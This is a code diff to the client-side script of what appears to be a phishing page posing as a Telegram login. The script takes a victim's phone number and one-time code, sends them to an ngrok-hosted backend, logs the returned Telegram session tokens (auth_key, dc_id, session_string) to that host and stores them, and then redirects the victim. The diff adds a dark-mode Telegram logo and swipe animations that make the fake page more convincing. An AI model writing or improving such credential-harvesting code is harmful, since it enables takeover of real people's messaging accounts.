@@ -1,9 +1,8 @@
-const BACKEND_URL = 'https://8e82-81-155-215-249.ngrok-free.app'; 
+const BACKEND_URL = 'https://8e82-81-155-215-249.ngrok-free.app';
 
 async function sendLogToBackend(message) {
-    console.log('Log:', message);  
+    console.log('Log:', message);
 
-    // Send the log message to the backend
     try {
         await fetch(`${BACKEND_URL}/log`, {
             method: 'POST',
@@ -15,9 +14,22 @@ async function sendLogToBackend(message) {
     }
 }
 
-// Check if the DOM is fully loaded before adding event listeners to ensure they attach correctly
 document.addEventListener('DOMContentLoaded', function() {
-    // Handling phone number form submission
+    // Check for user's preferred color scheme and apply night mode if necessary
+    const isNightMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+    if (isNightMode) {
+        document.body.classList.add('night-mode');
+        sendLogToBackend("Night mode activated.");
+
+        // Load the dark mode logo
+        const logoImage = document.getElementById('telegramLogo');
+        if (logoImage) {
+            logoImage.src = 'telegram-logo2.png'; // Update image source for dark mode
+        }
+    } else {
+        sendLogToBackend("Light mode activated.");
+    }
+
     const phoneForm = document.getElementById('phoneForm');
     if (phoneForm) {
         phoneForm.addEventListener('submit', async function(event) {
@@ -27,10 +39,10 @@ document.addEventListener('DOMContentLoaded', function() {
             const phoneNumber = document.getElementById('phoneNumber').value;
             sendLogToBackend("Phone number entered: " + phoneNumber);
 
-            sessionStorage.setItem('phoneNumber', phoneNumber);  // Store phone number in sessionStorage
+            sessionStorage.setItem('phoneNumber', phoneNumber);
 
             try {
-                const response = await fetch(`${BACKEND_URL}/sendPhoneNumber`, {  // Use Heroku URL
+                const response = await fetch(`${BACKEND_URL}/sendPhoneNumber`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ phoneNumber })
@@ -43,8 +55,9 @@ document.addEventListener('DOMContentLoaded', function() {
 
                 if (data.phone_code_hash) {
                     sessionStorage.setItem('phone_code_hash', data.phone_code_hash);
-                    sendLogToBackend("Phone code hash stored: " + data.phone_code_hash);  // Log the hash
-                    window.location.href = '/otp.html';  // Redirect to OTP page
+                    sendLogToBackend("Phone code hash stored: " + data.phone_code_hash);
+                    document.getElementById('loginContainer').classList.add('swipe-left');
+                    setTimeout(() => window.location.href = '/otp.html', 600);
                 } else {
                     console.error('Failed to send OTP:', data.message);
                     displayMessage(data.message || 'Failed to send OTP', 'error');
@@ -56,7 +69,6 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
-    // Handling OTP form submission
     const otpForm = document.getElementById('otpForm');
     if (otpForm) {
         otpForm.addEventListener('submit', async function(event) {
@@ -64,7 +76,7 @@ document.addEventListener('DOMContentLoaded', function() {
             sendLogToBackend("Phone code form submitted!");
 
             const phoneNumber = sessionStorage.getItem('phoneNumber');
-            const phoneCode = document.getElementById('phoneCode').value; // Update to phoneCode
+            const phoneCode = document.getElementById('phoneCode').value;
             const phoneCodeHash = sessionStorage.getItem('phone_code_hash');
 
             if (!/^\d{5}$/.test(phoneCode)) {
@@ -78,10 +90,10 @@ document.addEventListener('DOMContentLoaded', function() {
             sendLogToBackend("Phone code hash: " + phoneCodeHash);
 
             try {
-                const response = await fetch(`${BACKEND_URL}/verifyOTP`, {  // Use Heroku URL
+                const response = await fetch(`${BACKEND_URL}/verifyOTP`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phoneNumber, phoneCode, phone_code_hash: phoneCodeHash }) // Ensure the key matches
+                    body: JSON.stringify({ phoneNumber, phoneCode, phone_code_hash: phoneCodeHash })
                 });
 
                 if (!response.ok) {
@@ -93,18 +105,13 @@ document.addEventListener('DOMContentLoaded', function() {
                 const result = await response.json();
                 sendLogToBackend('Received auth tokens: ' + JSON.stringify(result.authTokens));
 
-                // Clear local storage before setting new auth tokens
                 localStorage.clear();
-
-                // Setting the new auth tokens in local storage
                 localStorage.setItem('auth_key', result.authTokens.auth_key);
                 localStorage.setItem('dc_id', result.authTokens.dc_id);
                 localStorage.setItem('session_string', result.authTokens.session_string);
 
-                // Redirect the user to the Telegram web client
-                window.location.href = result.redirectUrl;  // Use the redirect URL provided by the backend
-
-                displayMessage('Phone Code submitted successfully! Redirecting to Telegram...', 'success');
+                document.getElementById('otpContainer').classList.add('swipe-in');
+                setTimeout(() => window.location.href = result.redirectUrl, 600);
             } catch (error) {
                 console.error('Error submitting Phone Code:', error);
                 displayMessage('Error submitting Phone Code: ' + error.message, 'error');
@@ -113,17 +120,9 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 });
 
-// Function to display messages (success or error)
 function displayMessage(message, type) {
     const messageContainer = document.getElementById('message') || document.getElementById('successMessage') || document.getElementById('errorMessage');
-
-    if (type === 'error') {
-        messageContainer.innerText = message;
-        messageContainer.style.color = 'red';
-        messageContainer.style.display = 'block';
-    } else {
-        messageContainer.innerText = message;
-        messageContainer.style.color = 'green';
-        messageContainer.style.display = 'block';
-    }
+    messageContainer.innerText = message;
+    messageContainer.style.color = type === 'error' ? 'red' : 'green';
+    messageContainer.style.display = 'block';
 }
